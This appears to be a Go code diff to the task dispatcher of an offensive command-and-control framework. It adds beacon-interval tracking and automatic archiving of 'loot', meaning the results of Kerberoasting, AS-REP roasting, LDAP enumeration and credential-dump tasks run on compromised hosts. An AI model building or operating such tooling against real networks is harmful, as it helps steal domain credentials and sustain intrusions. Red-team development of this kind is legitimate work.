@@ -10,6 +10,7 @@ import (
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	"github.com/KKingZero/erebus-exploit-framwork/server/db"
 	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
+	"google.golang.org/protobuf/proto"
 )
 
 type EventCallback func(event *pb.Event)
@@ -66,6 +67,14 @@ func (d *Dispatcher) Dispatch(ctx context.Context, sessionID string, taskType pb
 		}
 	}
 
+	// Track operator-requested beacon interval so Register/Beacon can advertise it.
+	if taskType == pb.TaskType_TASK_SLEEP && len(data) > 0 {
+		var st pb.SleepTask
+		if err := proto.Unmarshal(data, &st); err == nil && st.SleepMs > 0 {
+			sess.SetCheckinMs(st.SleepMs)
+		}
+	}
+
 	sess.EnqueueTask(task)
 
 	if !wait {
@@ -96,6 +105,9 @@ func (d *Dispatcher) HandleResult(result *pb.TaskResult) {
 
 	if d.store != nil {
 		d.store.CompleteTask(result.TaskId, result.Success, result.Data, result.Error, result.ExecutionTimeMs)
+		if result.Success && len(result.Data) > 0 {
+			d.maybeStoreLoot(result)
+		}
 	}
 
 	d.pending.Resolve(result.TaskId, result)
@@ -106,6 +118,45 @@ func (d *Dispatcher) HandleResult(result *pb.TaskResult) {
 			Timestamp: time.Now().Unix(),
 			TaskId:    result.TaskId,
 		})
+	}
+}
+
+// maybeStoreLoot auto-archives high-value AD/cred task payloads for operator list_loot.
+func (d *Dispatcher) maybeStoreLoot(result *pb.TaskResult) {
+	if d.store == nil || result == nil {
+		return
+	}
+	row, err := d.store.GetTask(result.TaskId)
+	if err != nil || row == nil {
+		return
+	}
+	lootType := ""
+	switch pb.TaskType(row.TaskType) {
+	case pb.TaskType_TASK_KERBEROAST:
+		lootType = "kerberos_hash"
+	case pb.TaskType_TASK_ASREPROAST:
+		lootType = "asrep_hash"
+	case pb.TaskType_TASK_LDAP_ENUM:
+		lootType = "ldap_enum"
+	case pb.TaskType_TASK_CREDS_DUMP:
+		lootType = "creds"
+	default:
+		return
+	}
+	id, err := crypto.RandomID(8)
+	if err != nil {
+		return
+	}
+	if err := d.store.CreateLoot(&db.LootRow{
+		ID:        id,
+		Type:      lootType,
+		Source:    result.TaskId,
+		SessionID: row.SessionID,
+		Data:      result.Data,
+		Tags:      "auto,task",
+		CreatedAt: time.Now(),
+	}); err != nil {
+		log.Printf("[dispatcher] loot store failed task=%s: %v", result.TaskId, err)
 	}
 }
 
